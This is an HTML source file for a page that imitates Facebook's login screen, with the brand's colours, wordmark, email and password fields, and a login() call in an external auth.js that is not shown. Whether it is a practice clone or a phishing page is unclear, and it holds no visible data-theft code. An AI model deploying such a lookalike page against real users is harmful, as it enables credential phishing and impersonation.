<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook – Log in</title>
  <link rel="stylesheet" href="styles/general.css">
  <style>
    body {
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
    }
    .login-box {
      background: #fff;
      width: 360px;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,.1);
      text-align: center;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #1877f2;
      border: none;
      color: #fff;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2 style="color:#1877f2;font-size:40px;margin-bottom:20px">facebook</h2>
    <input type="text" id="email" placeholder="Email or phone number">
    <input type="password" id="password" placeholder="Password">
    <button onclick="login()">Log In</button>
  </div>

  <script src="scripts/auth.js"></script>
</body>
</html>
